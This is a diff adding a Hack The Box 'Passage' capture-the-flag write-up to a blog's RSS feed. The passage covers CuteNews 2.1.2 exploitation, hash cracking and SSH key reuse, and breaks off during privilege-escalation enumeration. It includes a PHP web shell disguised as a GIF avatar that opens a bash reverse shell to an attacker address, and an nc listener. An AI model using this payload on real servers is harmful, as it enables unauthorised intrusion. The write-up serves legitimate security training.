@@ -6,7 +6,289 @@
     <description>Recent content in writeup on Mdn1nj4</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>Copyright © 2020–2021, all rights reserved.</copyright>
-    <lastBuildDate>Wed, 17 Mar 2021 19:41:08 +0530</lastBuildDate><atom:link href="https://mdninja.ml/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 19 Mar 2021 01:14:23 +0530</lastBuildDate><atom:link href="https://mdninja.ml/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Passage Writeup</title>
+      <link>https://mdninja.ml/post/passage_htb/</link>
+      <pubDate>Fri, 19 Mar 2021 01:14:23 +0530</pubDate>
+      
+      <guid>https://mdninja.ml/post/passage_htb/</guid>
+      <description>
+        
+          &lt;h1 id=&#34;__introduction__&#34;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Passage is medium level machine, Enumuration is the key for this box. First we have to exploit the cutenews Web application to Get the initial reverse shell after that i found the bunch of php files which contains the user information with base64 format then we get the hash for the user paul and decrypt the hash and i login to to user paul. The user paul and nadav share the  ssh keys so i copied the ssh key and Get access to the user nadav after that i found the nadav user in sudo group and .vim info reveal the usefull imformation for getting root this machine  In order to root this machine i used the USBCreator D-Bus Privilege Escalation.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Skills Required : Enumuration
+Linux basic&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Skills Learned : web Exploitaion
+USBCreator D-Bus Privilege Escalation&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;__enumuration__&#34;&gt;&lt;strong&gt;Enumuration&lt;/strong&gt;&lt;/h1&gt;
+&lt;h4 id=&#34;__nmap-scan__&#34;&gt;&lt;strong&gt;Nmap scan&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;the nmap scan show there is 2 port open&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;22 ssh&lt;/li&gt;
+&lt;li&gt;80 http&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;#nmap -sV -sC -oN scan-tcp.nmap 10.10.10.206
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:32 GMT
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;Nmap scan report for 10.10.10.206
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;Host is up (0.040s latency).
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;Not shown: 998 closed ports
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;PORT   STATE SERVICE VERSION
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;| ssh-hostkey: 
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;|_http-server-header: Apache/2.4.18 (Ubuntu)
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;|_http-title: Passage News
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;span class=&#34;ln&#34;&gt;16&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;17&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;ln&#34;&gt;18&lt;/span&gt;Nmap done: 1 IP address (1 host up) scanned in 22.31 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;so the machine run the apache web server. I opened the web page in my browser&lt;/p&gt;
+&lt;h1 id=&#34;__cutenews__&#34;&gt;&lt;strong&gt;CuteNews&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/passage/passage_web_screen_shot.png&#34; alt=&#34;&#34;&gt;
+web page show the host name and give me the 2 Email address
+admin		: &lt;a href=&#34;mailto:nadav@passage.htb&#34;&gt;nadav@passage.htb&lt;/a&gt;&lt;br&gt;
+paul Colas	: &lt;a href=&#34;mailto:paul@passage.htb&#34;&gt;paul@passage.htb&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I add the passage.htb on my /etc/hosts file.&lt;br&gt;
+and the page reveals website is powered by Cutenews
+after searching on the internet i found the cutenews is the news management based on flat files as a storage.
+&lt;img src=&#34;https://mdninja.ml/images/passage/passage_cutenews_info.png&#34; alt=&#34;&#34;&gt;
+so after that i searched on the internet for any Exploit available for cutenews ad i looked the page source code i found some interesting information&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;# Source Page Code 
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;CuteNews/libs/css/cosmo.min.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;CuteNews/libs/css/font-awesome.min.css&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After that i go the directory Cutenews and i found the login page of the cutenews&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;https://10.10.10.206/CuteNews
+&lt;img src=&#34;https://mdninja.ml/images/passage/passage_cute_login_page.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;the login page of the Cutenews show the version of the cutenews is 2.1.2&lt;/p&gt;
+&lt;h1 id=&#34;__cutenews-212---remote-code-execution__&#34;&gt;&lt;strong&gt;CuteNews 2.1.2 - Remote Code Execution&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;so i check for the exploit in exploitdb using the command searchsploit&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ searchsploit cutenews 2.1.2&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;#searchsploit cutenews 2.1.2
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;----------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt; Exploit Title                                                                                       |  Path
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;----------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;CuteNews 2.1.2 - &amp;#39;avatar&amp;#39; Remote Code Execution (Metasploit)                                         | php/remote/46698.rb
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;CuteNews 2.1.2 - Arbitrary File Deletion                                                             | php/webapps/48447.txt
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                 | php/webapps/48458.txt
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;CuteNews 2.1.2 - Remote Code Execution                                                               | php/webapps/48800.py
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;----------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ searchsploit -m php/webapps/48800.py&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;if you want to run that script its ok but i have to exploit the cutenews manually.&lt;/p&gt;
+&lt;p&gt;Its simple 3 step process.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;create a user
+&lt;img src=&#34;https://mdninja.ml/images/passage/passage_create_user.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;then click on the personal options&lt;/li&gt;
+&lt;li&gt;scroll down you see the upload avatar upload the shell.php&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ vim shell.php&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;GIF8;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/YOURIP/1234 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;save the file and upload.&lt;br&gt;
+before open the avatar image you need to create a listener on port 1234 with nc commmand&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ nc -lvvnkp 1234&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;open the avatar image in the browser and
+i got that shell!&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;#nc -lvvnkp 1234
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;listening on [any] 1234 ...
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;connect to [10.10.14.xx] from (UNKNOWN) [10.10.10.206] 37080
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;bash: cannot set terminal process group (1635): Inappropriate ioctl for device
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;bash: no job control in this shell
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/uploads$ id    
+&lt;span class=&#34;ln&#34;&gt;7&lt;/span&gt;id
+&lt;span class=&#34;ln&#34;&gt;8&lt;/span&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;span class=&#34;ln&#34;&gt;9&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/uploads$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;__getting-user-paul__&#34;&gt;&lt;strong&gt;Getting User Paul&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;after some enumuration i found the directory which contains the user information and password hash in base64 format&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ ls
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;ls
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;01.php
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;09.php
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;0a.php
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;16.php
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;21.php
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;2a.php
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;32.php
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;52.php
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;5d.php
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;62.php
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;66.php
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;6e.php
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;77.php
+&lt;span class=&#34;ln&#34;&gt;16&lt;/span&gt;7a.php
+&lt;span class=&#34;ln&#34;&gt;17&lt;/span&gt;81.php
+&lt;span class=&#34;ln&#34;&gt;18&lt;/span&gt;8f.php
+&lt;span class=&#34;ln&#34;&gt;19&lt;/span&gt;97.php
+&lt;span class=&#34;ln&#34;&gt;20&lt;/span&gt;a5.php
+&lt;span class=&#34;ln&#34;&gt;21&lt;/span&gt;b0.php
+&lt;span class=&#34;ln&#34;&gt;22&lt;/span&gt;b1.php
+&lt;span class=&#34;ln&#34;&gt;23&lt;/span&gt;c8.php
+&lt;span class=&#34;ln&#34;&gt;24&lt;/span&gt;d2.php
+&lt;span class=&#34;ln&#34;&gt;25&lt;/span&gt;d4.php
+&lt;span class=&#34;ln&#34;&gt;26&lt;/span&gt;d5.php
+&lt;span class=&#34;ln&#34;&gt;27&lt;/span&gt;d6.php
+&lt;span class=&#34;ln&#34;&gt;28&lt;/span&gt;e0.php
+&lt;span class=&#34;ln&#34;&gt;29&lt;/span&gt;f3.php
+&lt;span class=&#34;ln&#34;&gt;30&lt;/span&gt;fc.php
+&lt;span class=&#34;ln&#34;&gt;31&lt;/span&gt;lines
+&lt;span class=&#34;ln&#34;&gt;32&lt;/span&gt;users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;cat 09.php&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 09.php
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;cat 09.php
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&amp;lt;?php die(&amp;#39;Direct call - access denied&amp;#39;); ?&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Decode the base64&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;echo base64_text | base64 -d&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &amp;#34;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319&amp;#34; | base64 -d
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&amp;lt;Fzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319&amp;#34; | base64 -d                     
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;a:1:{s:5:&amp;#34;email&amp;#34;;a:1:{s:16:&amp;#34;paul@passage.htb&amp;#34;;s:10:&amp;#34;paul-coles&amp;#34;;}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;so i decided to decode all the files i know the base64 is mostly start with &amp;quot;Y&amp;quot;
+so used the command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ grep -rh Y | base64 -d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://mdninja.ml/images/passage/passage_paul_hash.png&#34; alt=&#34;&#34;&gt;
+i got the paul user hash
+let crack the hash with john&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ echo &#39;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&#39; &amp;gt; hash&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;john hash --wordlist=/opt/rockyou.txt --format=Raw-SHA256&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;#john hash --wordlist=/opt/rockyou.txt --format=Raw-SHA256
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;Using default input encoding: UTF-8
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;Warning: poor OpenMP scalability for this hash type, consider --fork=2
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;Will run 2 OpenMP threads
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;atlanXXX         (?)
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;1g 0:00:00:00 DONE (2021-03-18 18:52) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;Use the &amp;#34;--show --format=Raw-SHA256&amp;#34; options to display all of the cracked passwords reliably
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;change the user to paul&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;su paul&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&amp;lt;tml/CuteNews/cdata/users$ python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;    
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;su paul
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;Password: 
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;7&lt;/span&gt;paul@passage:/var/www/html/CuteNews/cdata/users$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Found the user flag at /home/paul/user.txt&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;paul@passage:~$ pwd
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;pwd
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;/home/paul
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;paul@passage:~$ wc user.txt
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;wc user.txt
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt; 1  1 33 user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;__privilage-escalation__&#34;&gt;&lt;strong&gt;Privilage Escalation&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;after some enumuration
+i found the interesting only one entry in the auhorization_keys&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;paul@passage:~/.ssh$ cat authorized_keys
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;cat authorized_keys
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;__getting-user-nadav__&#34;&gt;&lt;strong&gt;Getting User nadav&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;then i assume there is a possible that the user paul and nadav have shared SSH keys. so i copied the id_rsa file from the paul.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ chmod 600 nadav.key&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ ssh -i nadav.key &lt;a href=&#34;mailto:nadav@passage.htb&#34;&gt;nadav@passage.htb&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;It worked&lt;/strong&gt; I got the user nadav&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;chmod 600 nadav.key
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;ssh -i nadav.key nadav@passage.htb
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;nadav@passage:~$ id
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt;uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+&lt;span class=&#34;ln&#34;&gt;7&lt;/span&gt;nadav@passage:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;__getting-root__&#34;&gt;&lt;strong&gt;Getting Root&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;After some enumuration i found the some interesting information from &lt;strong&gt;.vim&lt;/strong&gt; file
+The vim history indicates that there have been some changes in the files /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf and /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;nadav@passage:~$ cat  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;nadav@passage:~$ cat  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;&amp;lt;!DOCTYPE busconfig PUBLIC
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt; &amp;#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&amp;#34;
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt; &amp;#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&amp;#34;&amp;gt;
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;&amp;lt;busconfig&amp;gt;
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;  &amp;lt;!-- Only root can own the service --&amp;gt;
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;  &amp;lt;policy user=&amp;#34;root&amp;#34;&amp;gt;
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;    &amp;lt;allow own=&amp;#34;com.ubuntu.USBCreator&amp;#34;/&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;  &amp;lt;/policy&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;  &amp;lt;!-- Allow anyone to invoke methods (further constrained by
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;       PolicyKit privileges --&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;  &amp;lt;policy context=&amp;#34;default&amp;#34;&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;    &amp;lt;allow send_destination=&amp;#34;com.ubuntu.USBCreator&amp;#34; 
+&lt;span class=&#34;ln&#34;&gt;16&lt;/span&gt;           send_interface=&amp;#34;com.ubuntu.USBCreator&amp;#34;/&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;17&lt;/span&gt;    &amp;lt;allow send_destination=&amp;#34;com.ubuntu.USBCreator&amp;#34; 
+&lt;span class=&#34;ln&#34;&gt;18&lt;/span&gt;           send_interface=&amp;#34;org.freedesktop.DBus.Introspectable&amp;#34;/&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;19&lt;/span&gt;    &amp;lt;allow send_destination=&amp;#34;com.ubuntu.USBCreator&amp;#34; 
+&lt;span class=&#34;ln&#34;&gt;20&lt;/span&gt;           send_interface=&amp;#34;org.freedesktop.DBus.Properties&amp;#34;/&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;21&lt;/span&gt;  &amp;lt;/policy&amp;gt;
+&lt;span class=&#34;ln&#34;&gt;22&lt;/span&gt;
